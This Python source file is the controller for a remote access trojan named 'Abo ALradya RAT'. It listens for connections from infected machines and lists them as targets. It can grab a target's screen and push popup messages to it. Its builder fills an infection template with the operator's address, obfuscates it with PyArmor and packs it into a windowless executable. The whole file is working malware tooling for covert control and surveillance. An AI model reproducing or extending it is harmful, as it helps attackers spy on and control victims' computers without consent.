import sys
from PyQt5.QtCore import Qt
import os
from PyQt5.QtCore import QTimer
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QTableWidget, QTableWidgetItem, QToolBar, \
    QAction, QPushButton, QLineEdit, QHBoxLayout, QLabel, QMenu
import socket
import pyautogui
import cv2
import numpy as np
import time
import threading
from PyQt5.QtWidgets import QMessageBox
import subprocess

myTargets = []


class ListTargetsTable(QTableWidget):
    def __init__(self):
        super().__init__()
        self.setColumnCount(2)
        self.setHorizontalHeaderLabels(['Target IP', 'Port'])
        self.setStyleSheet('font-size: 25px')

        # Initially populate the table with the empty list
        self.update_table()

        self.setSelectionBehavior(QTableWidget.SelectRows)
        self.resizeColumnsToContents()
        self.setColumnWidth(0, 250)
        self.setColumnWidth(1, 150)

        # Create a timer to periodically update the table
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_table)
        self.timer.start(1000)  # Update every 1000 milliseconds (1 second)

        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self.show_context_menu)

    def update_table(self):
        # Clear the existing rows
        self.setRowCount(0)

        # Iterate through myTargets list and add rows
        for target, target_addr in myTargets:
            rowPosition = self.rowCount()
            self.insertRow(rowPosition)
            self.setItem(rowPosition, 0, QTableWidgetItem(str(target_addr[0])))
            self.setItem(rowPosition, 1, QTableWidgetItem(str(target_addr[1])))

    def show_context_menu(self, pos):
        menu = QMenu(self)
        remove_action = QAction("Remove Target")
        menu.addAction(remove_action)
        Monitor_action = QAction("Monitor Target")
        menu.addAction(Monitor_action)
        popout_action = QAction("popout Target")
        menu.addAction(popout_action)
        CMD_action = QAction("CMD Target")
        menu.addAction(CMD_action)
        CopyFile_action = QAction("CopyFile Target")
        menu.addAction(CopyFile_action)
        action = menu.exec_(self.mapToGlobal(pos))
        selected_row = self.currentRow()
        target_addr_item = self.item(selected_row, 0)

        if action == remove_action:
            self.remove_selected_target(self.find_target())
        elif action == Monitor_action:
            self.receive_frames(self.find_target())
        elif action == popout_action:
            self.popout_fun(self.find_target())

    def find_target(self):
        selected_row = self.currentRow()
        target_addr_item = self.item(selected_row, 0)
        if target_addr_item:
            target_addr = target_addr_item.text()
            matching_target = None
            for target, addr in myTargets:
                if addr[0] == target_addr:
                    matching_target = target
                    return matching_target

    def remove_selected_target(self, target):
        selected_row = self.currentRow()
        if selected_row != -1:
            target, target_addr = myTargets[selected_row]
            remove_target(target, target_addr)

    def receive_frames(self, target):

        message = 'monitor'
        target.send(message.encode())

        shape_str = target.recv(1024).decode()
        image_shape = tuple(map(int, shape_str.split(',')))

        time.sleep(1)
        # Receive the image size
        image_size = int(target.recv(16).strip())
        print('reciveing the image')
        # Receive the image data and reconstruct it
        received_image_data = b""
        while len(received_image_data) < image_size:
            received_image_data += target.recv(image_size - len(received_image_data))

        # Convert bytes back to image and display
        image = np.frombuffer(received_image_data, dtype=np.uint8).reshape(image_shape)
        print(image.shape)
        cv2.imwrite("Received_Screen.png", image)
        cv2.waitKey(1)
        time.sleep(3)
        print('got the monitor')

    def popout_fun(self, target):
        message = 'popout'
        target.send(message.encode())
        time.sleep(1)
        message_popout = input('what to send?\n')
        print('sending popout with '+message_popout)
        target.send(message_popout.encode())
        time.sleep(1)
        print('popout sent!')
def add_target(target, target_addr):
    # Check if the target_addr is already in the list
    for i, (existing_target, existing_addr) in enumerate(myTargets):
        if existing_addr[0] == target_addr[0]:
            # Remove the old entry if it exists
            remove_target(existing_target, existing_addr)
            break

    myTargets.append((target, target_addr))


def remove_target(target, target_addr):
    myTargets.remove((target, target_addr))


class MyMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setGeometry(1200, 300, 500, 500)
        self.setWindowTitle("Abo ALradya RAT")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()
        central_widget.setLayout(layout)

        toolbar = QToolBar()
        toolbar.setMovable(False)
        new_action = QAction("Build", self)
        self.addToolBar(toolbar)
        toolbar.addAction(new_action)
        new_action.triggered.connect(self.on_action_triggered)

        table_widget = ListTargetsTable()
        button = QPushButton("Click Me")

        layout.addWidget(table_widget)
        layout.addWidget(button)

    def on_action_triggered(self):
        self.win2 = QMainWindow()
        self.win2.setGeometry(1200, 300, 500, 500)
        self.win2.setWindowTitle("Abo ALradya RAT - Builder")
        central_widget = QWidget()
        self.win2.setCentralWidget(central_widget)
        layout = QVBoxLayout()
        central_widget.setLayout(layout)

        # Add QLabel, QLineEdit, and QPushButton widgets
        address_label = QLabel("Address:")
        port_label = QLabel("Port:")
        address_input = QLineEdit()
        port_input = QLineEdit()
        build_button = QPushButton("Build")

        # Create horizontal layouts for Address and Port
        address_layout = QHBoxLayout()
        address_layout.addWidget(address_label)
        address_layout.addWidget(address_input)
        port_layout = QHBoxLayout()
        port_layout.addWidget(port_label)
        port_layout.addWidget(port_input)

        # Add the layouts and button to the main layout
        layout.addLayout(address_layout)
        layout.addLayout(port_layout)
        layout.addWidget(build_button)
        build_button.clicked.connect(lambda: self.create_infection_script(address_input.text(), port_input.text()))
        self.win2.show()

    def create_infection_script(self, address, port):
        template_file = r"C:\Users\basha\Desktop\Hacking\pythonProject1\infection_template.py"
        output_file = r"C:\Users\basha\Desktop\Hacking\pythonProject1\infection.py"

        try:
            # Read the content of the template file
            with open(template_file, "r") as f:
                template_content = f.read()

            # Replace placeholders with actual values
            modified_content = template_content.format(address=address, port=port)

            # Save the modified content to the output file
            with open(output_file, "w") as f:
                f.write(modified_content)

            # Your Python script file (infection.py)
            script_file = output_file

            # Output directory for PyArmor
            output_dir = r"C:\Users\basha\Desktop\Hacking\pythonProject1\dist"

            # Ensure the output directory exists
            os.makedirs(output_dir, exist_ok=True)

            # Step 1: Obfuscate the script using PyArmor
            pyarmor_cmd = f"pyarmor gen --output={output_dir} {script_file}"
            subprocess.run(pyarmor_cmd, shell=True)

            # Step 2: Use PyInstaller to create the executable
            pyinstaller_cmd = f"pyinstaller --onefile --noconsole --distpath {output_dir} {script_file}"
            subprocess.run(pyinstaller_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            print(f"Executable created: {os.path.join(output_dir, output_file)}")

            # Show a success message box
            msg = QMessageBox()
            msg.setIcon(QMessageBox.Information)
            msg.setText("File successfully created.")
            msg.setWindowTitle("Success")
            msg.exec_()
        except Exception as e:
            print(f"Error creating infection script: {e}")


# Accept the incoming connection
class mytargetinfo:
    def __init__(self, tar, tar_addr):
        self.tar = tar
        self.tar_addr = tar_addr

    def introduce(self):
        print(f"Accepted connection from {self.tar_addr[0]}:{self.tar_addr[1]}")


def listen_fun():
    # Define the listening IP address and port
    listener_ip = "0.0.0.0"
    listener_port = 1222

    # Create a socket object and start listening for incoming connections
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((listener_ip, listener_port))
    listener.listen(1)

    while True:
        target, target_addr = listener.accept()
        got_tar = mytargetinfo(target, target_addr)
        got_tar.introduce()
        add_target(target, target_addr)


listen_thread = threading.Thread(target=listen_fun)
listen_thread.start()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MyMainWindow()
    window.show()
    sys.exit(app.exec_())
